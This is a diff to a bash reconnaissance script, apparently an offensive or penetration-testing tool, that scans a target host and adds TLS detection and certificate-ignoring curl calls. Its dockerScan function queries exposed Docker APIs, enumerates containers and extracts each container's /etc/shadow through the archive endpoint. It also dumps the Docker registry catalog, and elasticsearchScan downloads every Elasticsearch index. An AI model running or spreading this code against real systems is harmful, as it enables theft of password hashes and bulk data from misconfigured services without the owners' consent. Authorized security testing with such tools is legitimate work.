@@ -1,5 +1,5 @@
 #!/bin/bash
-# 20180307 Kirby
+# 20180315 Kirby
 
 
 umask 077
@@ -13,6 +13,8 @@ function MAIN()
     local jobscount
     local port
     local rawport
+    local proto
+    local ssl
     
     export TARGET=$1 
     export RECONDIR="${HOME}/mkrecon/${TARGET}"
@@ -88,7 +90,17 @@ function MAIN()
             echo "https://${TARGET}:${port}" >> "$RECONDIR"/${TARGET}.baseurls
         fi
 
-    
+        # check for SSL/TLS
+        if echo quit|openssl s_client -showcerts -connect ${TARGET}:${port} 2>/dev/null |grep CERTIFICATE >/dev/null 2>&1
+        then
+            echo quit|openssl s_client -showcerts -connect ${TARGET}:${port} > "$RECONDIR"/${TARGET}.${port}.certificate 2>&1
+            ssl=1
+            proto="https"
+        else
+            ssl=0
+            proto="http"
+        fi
+
         # rsh
         if echo $rawport |egrep -q '^514/open'
         then
@@ -151,7 +163,7 @@ function MAIN()
         if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//http//Elasticsearch'
         then
             echo "starting elasticsearchScan"
-            elasticsearchScan $port &
+            elasticsearchScan $port $proto &
         fi
     
         # iscsi
@@ -162,10 +174,10 @@ function MAIN()
         fi
     
         # docker
-        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//docker//Docker'
+        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//.*//Docker'
         then
             echo "starting dockerScan"
-            dockerScan $port &
+            dockerScan $port $proto 
         fi
         # postgres
         if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//postgresql'
@@ -918,29 +930,32 @@ function postgresqlScan()
 function dockerScan()
 {
     local port=$1
+    local proto=$2
     local id
 
-    $TIMEOUT 60 curl http://${TARGET}:$port/info 2>/dev/null|jq -M . \
+    $TIMEOUT 60 curl -k -s ${proto}://${TARGET}:$port/info 2>/dev/null|jq -M . \
         >> "$RECONDIR"/${TARGET}.dockerinfo 2>&1
 
-    $TIMEOUT 60 curl http://${TARGET}:$port/networks 2>/dev/null|jq -M . \
+    $TIMEOUT 60 curl -k -s ${proto}://${TARGET}:$port/networks 2>/dev/null|jq -M . \
         >> "$RECONDIR"/${TARGET}.dockernetworks 2>&1
 
-    $TIMEOUT 60 curl http://${TARGET}:$port/containers/json 2>/dev/null|jq -M . \
+    $TIMEOUT 60 curl -k -s ${proto}://${TARGET}:$port/containers/json 2>/dev/null|jq -M . \
         >> "$RECONDIR"/${TARGET}.dockercontainers 2>&1
 
     for id in $(grep '"Id": ' "$RECONDIR"/${TARGET}.dockercontainers |cut -d'"' -f4)
     do
-        $TIMEOUT 60 curl http://${TARGET}:${port}/containers/${id}/top 2>/dev/null|jq -M . \
+        $TIMEOUT 60 curl -k -s ${proto}://${TARGET}:${port}/containers/${id}/top 2>/dev/null|jq -M . \
             >> "$RECONDIR"/dockertop.${id}
-        $TIMEOUT 60 curl http://${TARGET}:${port}/containers/${id}/changes 2>/dev/null|jq -M . \
+        $TIMEOUT 60 curl -k -s ${proto}://${TARGET}:${port}/containers/${id}/changes 2>/dev/null|jq -M . \
             >> "$RECONDIR"/dockerchanges.${id}
-        $TIMEOUT 60 curl "http://${TARGET}:${port}/containers/${id}/archive?path=/etc/shadow" \
+        $TIMEOUT 60 curl -k -s "${proto}://${TARGET}:${port}/containers/${id}/archive?path=/etc/shadow" \
             2>/dev/null|tar xf - -O \
             >> "$RECONDIR"/dockershadow.${id} 2>/dev/null
 
     done
 
+    $TIMEOUT 60 curl -k -s ${proto}://${TARGET}:${port}/v2/_catalog 2>/dev/null|jq -M . \
+        >> "$RECONDIR"/${TARGET}.${port}.dockerepo 2>&1
 
     return 0
 }
@@ -962,13 +977,14 @@ function iscsiScan()
 function elasticsearchScan()
 {
     local port=$1
+    local proto=$2
     local index
 
-    $TIMEOUT 90 curl -s "http://${TARGET}:${port}/_cat/indices?v" > "$RECONDIR"/${TARGET}.elasticsearch.${port} 2>&1
+    $TIMEOUT 90 curl -k -s "${proto}://${TARGET}:${port}/_cat/indices?v" > "$RECONDIR"/${TARGET}.elasticsearch.${port} 2>&1
     mkdir "$RECONDIR"/${TARGET}.elasticsearch.indexes.${port}
     for index in $(awk '{print $3}' "$RECONDIR"/${TARGET}.elasticsearch.${port} |egrep -v "^index$" )
     do
-        $TIMEOUT 60 curl -s "http://${TARGET}:${port}/${index}/" 2>/dev/null |jq . \
+        $TIMEOUT 60 curl -k -s "${proto}://${TARGET}:${port}/${index}/" 2>/dev/null |jq . \
             > "$RECONDIR"/${TARGET}.elasticsearch.indexes.${port}/$index 2>&1
     done
 
